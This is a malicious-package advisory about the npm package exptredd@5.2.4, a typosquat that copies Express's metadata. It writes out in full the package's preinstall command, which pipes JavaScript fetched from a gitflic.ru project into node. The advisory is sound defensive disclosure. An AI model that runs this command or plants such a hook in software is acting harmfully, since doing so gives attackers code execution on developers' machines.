summary: exptredd preinstall fetches and executes remote JavaScript via web.archive.org/gitflic.ru
details: Package `exptredd@5.2.4` declares a `preinstall` lifecycle script in package.json that runs `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`, downloading JavaScript from a third-party host (gitflic.ru project `hellscripter/install-scripts`, proxied through web.archive.org) and piping the response directly into `node`. The fetched content is unpinned, not hash- or signature-verified, and the host is unrelated to any legitimate publisher of this package. Any `npm install` of this package therefore executes arbitrary attacker-controlled code on the installer's machine before any application code runs. The package also impersonates Express: it ships Express's author metadata (TJ Holowaychuk), repository (`expressjs/express`), homepage (`expressjs.com`), description, and dependency list, while the package name `exptredd` is a lookalike for `express` — a typosquat shape intended to catch mistyped installs.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
